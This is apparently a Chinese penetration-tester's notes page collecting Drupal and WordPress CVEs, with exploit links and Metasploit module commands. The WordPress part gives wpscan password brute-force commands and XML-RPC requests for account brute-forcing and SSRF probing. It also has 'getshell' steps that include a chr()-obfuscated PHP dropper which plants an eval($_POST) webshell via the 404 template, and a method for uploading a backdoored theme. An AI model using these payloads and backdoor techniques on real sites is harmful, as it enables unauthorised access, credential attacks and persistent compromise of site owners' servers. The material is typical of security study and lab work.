---
# 这是页面的图标
icon: blog
# 这是文章的标题
title: CMS漏洞收集
# 设置作者
author: lhz
# 设置写作时间
time: 2021-08-31
# 一个页面只能有一个分类
category: 渗透
# 一个页面可以有多个标签
tag:
  - CMS
comment: false
---

## Drupal
> 官网 : <https://www.drupal.org/>
### CVE-2014-3704 “Drupalgeddon” SQL 注入漏洞  
 - 简介  
  Drupal 7.0~7.31 版本中存在一处无需认证的 SQL 漏洞。通过该漏洞，攻击者可以执行任意 SQL 语句，插入、修改管理员信息，甚至执行任意代码。
 - 影响版本  
    - Drupal 7.0 ~ 7.31
 - POC | Payload | exp  
    - <https://vulhub.org/#/environments/drupal/CVE-2014-3704/>
    - <https://www.exploit-db.com/exploits/34992>
 - MSF Module
   ```
   use exploit/multi/http/drupal_drupageddon
   set RHOSTS [ip]
   run
   ```
---
### CVE-2018-7600 Drupal Drupalgeddon 2 远程代码执行漏洞
  - 简介  
    Drupal 是一款用量庞大的 CMS，其 6/7/8 版本的 Form API 中存在一处远程代码执行漏洞。  
  - 影响版本  
    - Drupal 6/7/8
  - POC | Payload | exp  
    - <https://vulhub.org/#/environments/drupal/CVE-2018-7600/>
    - <https://github.com/pimps/CVE-2018-7600>
    - <https://github.com/dreadlocked/Drupalgeddon2>
  - MSF Module
    ```
    use exploit/unix/webapp/drupal_drupalgeddon2
    set RHOSTS [ip]
    run
    ```
---
### CVE-2018-7602 远程代码执行漏洞
  - 影响版本  
    - Drupal 7.x  
    - Drupal 8.x
  - POC | Payload | exp
    - [【漏洞分析】DRUPAL内核远程代码执行漏洞CVE-2018-7602](http://blog.nsfocus.net/cve-2018-7602-drupal/)
    - <https://vulhub.org/#/environments/drupal/CVE-2018-7602/>
    - <https://github.com/pimps/CVE-2018-7600>
---
### CVE-2017-6920 Drupal Core 8 PECL YAML 反序列化任意代码执行漏洞
  - 简介  
    2017年6月21日,Drupal 官方发布了一个编号为 CVE-2017- 6920 的漏洞,影响为 Critical.这是 Drupal Core 的 YAML 解析器处理不当所导致的一个远程代码执行漏洞,影响 8.x 的 Drupal Core.
  - 影响版本  
    - Drupal 8.x
  - 文章  
    - [CVE-2017-6920:Drupal远程代码执行漏洞分析及POC构造](https://paper.seebug.org/334/)
    - [Drupal Core 8 PECL YAML 反序列化任意代码执行漏洞 (CVE-2017-6920)](https://vulhub.org/#/environments/drupal/CVE-2017-6920/)
---
### CVE-2019-6339 远程代码执行漏洞
  - 简介  
    phar 反序列化 RCE
  - 影响版本  
    - Drupal 7.0 ~ 7.62
    - Drupal 8.5.0 ~ 8.5.9
    - Drupal 8.6.0 ~ 8.6.6
  - POC | Payload | exp
    - [Drupal 1-click to RCE 分析](https://paper.seebug.org/897/)
    - <https://vulhub.org/#/environments/drupal/CVE-2019-6339/>
---
### CVE-2019-6341 XSS
  - 简介  
    通过文件模块或者子系统上传恶意文件触发 XSS 漏洞
  - 影响版本  
    - Drupal 7.0 ~ 7.65
    - Drupal 8.5.0 ~ 8.5.14
    - Drupal 8.6.0 ~ 8.6.13
  - POC | Payload | exp
    - [Drupal 1-click to RCE 分析](https://paper.seebug.org/897/)
    - <https://vulhub.org/#/environments/drupal/CVE-2019-6341/>
---
### CVE-2020-28948
  - POC | Payload | exp  
    - [Drupal(CVE-2020-28948/CVE-2020-28949)分析](https://mp.weixin.qq.com/s/-5z2gCrstyCLOOzgf1tZTg)

------

## WordPress

> 官网 : https://wordpress.org/

WordPress 是一个开源的内容管理系统(CMS),允许用户构建动态网站和博客.

- 搭建教程
  - [WordPress 搭建](https://github.com/lhzzzzzz/1earn/blob/master/1earn/Integrated/Linux/Power-Linux.md#WordPress)

- 登录地址	

​		默认登录地址：`/wp-admin` 或 `/wp-login.php`

### 工具

- [wpscan](https://github.com/wpscanteam/wpscan)

  ```
  wpscan --url https://www.xxxxx.com/     # 直接扫描
  wpscan --url https://www.xxxxx.com/ --enumerate u    # 枚举用户
  wpscan --url https://www.xxxxx.com/ --passwords /tmp/password.txt   # 密码爆破
  wpscan --url https://www.xxxxx.com/ --usernames admin --passwords out.txt  # 指定用户爆破
  wpscan --url https://www.xxxxx.com/ --api-token xxxxxxxxCX8TTkkgt2oIY   # 使用 API Token,扫描漏洞
  wpscan --url https://www.xxxxx.com/ -e vp --api-token xxxxxxx    # 扫描插件漏洞
  wpscan --url https://www.xxxxx.com/ -e vt --api-token xxxxxxx    # 扫描主题漏洞
  ```

### xmlrpc.php

- [xmlrpc.php 漏洞利用](https://blog.csdn.net/u012206617/article/details/109002948)

- 查看系统允许的方法

  ```
  POST /wordpress/xmlrpc.php HTTP/1.1
  Host: www.example.com
  Content-Length: 99
  
  <methodCall>
  <methodName>system.listMethods</methodName>
  <params></params>
  </methodCall>
  ```

- 账号爆破

  一般情况下，wordpress 的管理后台都会设置账号登录失败次数限制，因此，可以通过 xmlprc.php 接口来进行爆破。通常会使用 wp.getUserBlogs、wp.getCategories 和 metaWeblog.getUsersBlogs 这个方法来进行爆破，也可以使用其他的方法。

  ```
  POST /wordpress/xmlrpc.php HTTP/1.1
  Host: www.example.com
  Content-Length: 99
  
  <methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
  <param><value>admin</value></param>
  <param><value>password</value></param>
  </params>
  </methodCall>
  ```

- SSRF

  WordPress 版本 < 3.5.1, 通过 Pingback 可以实现的服务器端请求伪造 (Server-side request forgery，SSRF) 和远程端口扫描。

  ```
  POST /wordpress/xmlrpc.php HTTP/1.1
  Host: www.example.com
  Content-Length: 99
  
  <methodCall>
  <methodName>pingback.ping</methodName>
  <params><param>
  <value><string>要探测的ip和端口：http://127.0.0.1:80</string></value>
  </param><param><value><string>网站上一篇博客的URL：http://localhost/wordpress/?p=1)<SOME VALID BLOG FROM THE SITE ></string>
  </value></param></params>
  </methodCall>
  ```

### WordPress 后台拿 SHELL

- 后台编辑404页面Getshell

  "主题"-“编辑”-“404.php”

  ```
  <script language="php">fputs(fopen(chr(46).chr(47).chr(99).chr(111).chr(110).chr(103).chr(46).chr(112).chr(104).chr(112),w),chr(60).chr(63).chr(112).chr(104).chr(112).chr(32).chr(64).chr(101).chr(118).chr(97).chr(108).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(39).chr(112).chr(97).chr(115).chr(115).chr(39).chr(93).chr(41).chr(59).chr(63).chr(62));</script>
  ```

  插到文件头,404默认模板路径是：wp-content/themes/twentyten/404.php,其中"twentyten"目录是默认模板目录。更新完直接访问 localhost/wp-content/themes/twentyten/404.php 就会在twentyten目录生成一句话后门文件cong.php 密码pass，插入的代码是Chr加密，可自行编辑。（仔细看代码，文件名与一句话代码用" ,w "隔开了）

- 上传本地主题Getshell

  本机建立目录“test”,可以直接把一句话放到index.php文件，再新建一个style.css样式文件(版本不同，上传时会判断是否存在"index.php"文件和"style.css"样式文件。)

  打包test目录为zip文件。WP后台的主题管理，上传主题，安装。则你的后门路径为： `localhost/wp-content/themes/test/index.php`

### 插件漏洞

- WordPress Plugin Mail Masta 1.0 - Local File Inclusion
  - https://www.exploit-db.com/exploits/40290

### CVE-2019-8942 & CVE-2019-8943 WordPress Crop-image Shell Upload

- 简介

  此模块利用 WordPress 版本5.0.0和<= 4.9.8上的路径遍历和本地文件包含漏洞。 裁剪图像功能允许用户（至少具有作者权限）通过在上载期间更改 _wp_attached_file 引用来调整图像大小并执行路径遍历。 利用的第二部分将通过在创建帖子时更改 _wp_page_template 属性，将该图像包含在当前主题中。 目前，此漏洞利用模块仅适用于基于 Unix 的系统。

- 影响版本

  - wordpress < 4.9.9
  - wordpress 5.0 ~ 5.0:rc3

- POC | Payload | exp

  - [brianwrf/WordPress_4.9.8_RCE_POC: A simple PoC for WordPress RCE (author priviledge), refer to CVE-2019-8942 and CVE-2019-8943.](https://github.com/brianwrf/WordPress_4.9.8_RCE_POC)

- MSF Module

  ```
  use exploit/multi/http/wp_crop_rce
  ```

### WordPress <= 5.3.? DoS

- POC | Payload | exp
  - [wordpress-dos-poc](https://github.com/roddux/wordpress-dos-poc)

